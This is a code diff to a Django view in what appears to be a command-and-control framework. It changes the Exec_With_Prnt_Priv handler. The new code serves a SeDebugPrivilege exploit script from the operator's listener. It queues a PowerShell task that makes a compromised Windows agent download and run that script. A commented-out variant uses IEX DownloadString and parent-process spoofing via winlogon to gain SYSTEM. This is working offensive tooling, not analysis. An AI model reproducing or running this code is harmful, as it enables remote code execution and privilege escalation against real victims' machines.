@@ -643,18 +643,30 @@ def Exec_With_Prnt_Priv(request):
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
-        agentTask.save() 
-        system_pid = request.POST['system_pid']    
+        agentTask.save()
         path_to_execute = request.POST['path_to_execute']
         listenerdata = ListenerForm.objects.order_by("-created_date").get()
         ip = listenerdata.ip
+        agentdata = Agent.objects.filter(name=agent).values()[0]
+        username = agentdata['username']
+        username= username.split("\\")
         os.system("timeout 30 python -m http.server 8888 --directory {} & ".format(tools_path))
-        task = "IEX (New-Object Net.WebClient).DownloadString('http://{}:8888/psgetsys.ps1');[MyProcess]::CreateProcessFromParent({},'{}','')".format(ip,system_pid,path_to_execute)
+        os.system("timeout 20 python -m http.server 4444 --directory /tmp & ".format(tools_path))
+        f = open("{}".format(tools_path+"/Exploitation/windows/SeDebugPriv"), "rt")
+        exep = f.read()
+        exep = exep.replace("replace_ip",ip)
+        exep = exep.replace("replace_exec_path",path_to_execute)
+
+        with open("/tmp/sedebug.ps1", "w") as f:
+            f.write(exep)
+            f.close
+        #;powershell -file "$env:userprofile\sedebug.ps1
+        task= '(New-Object Net.WebClient).DownloadFile(\'http://{0}:4444/sedebug.ps1\', \'c:/users/{1}/test.ps1\');powershell -file c:/users/{1}/test.ps1'.format(ip,username[1])
+        # task= 'whoami /priv > $env:USERPROFILE"/privs";$file = $env:USERPROFILE+"\privs";$h= Get-content $file | select-string "^SeDebugPrivilege";$enabletest= $h -split "\s+";if($enabletest[3] -eq \'Enabled\') {tasklist > $env:USERPROFILE"/tasks";$file = $env:USERPROFILE+"\tasks";$h= Get-content $file | select-string "^winlogon.exe";$processid= $h -split "\s+";IEX(New-Object Net.WebClient).DownloadString(\'http://{}:8888/psgetsys.ps1\');[MyProcess]::CreateProcessFromParent($processid[1],\'{}','\')}}else {{if($enabletest[3] -eq \'Disabled\'){{echo "SeDebugPrivilege is Disabled"}} else {{echo "SeDebugPrivilege is not assigned"}} }}'.format(ip,path_to_execute)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
             f.close()
-        
         return JsonResponse({},status=200)
     else:
         return render(request, 'blog/listeners.html')
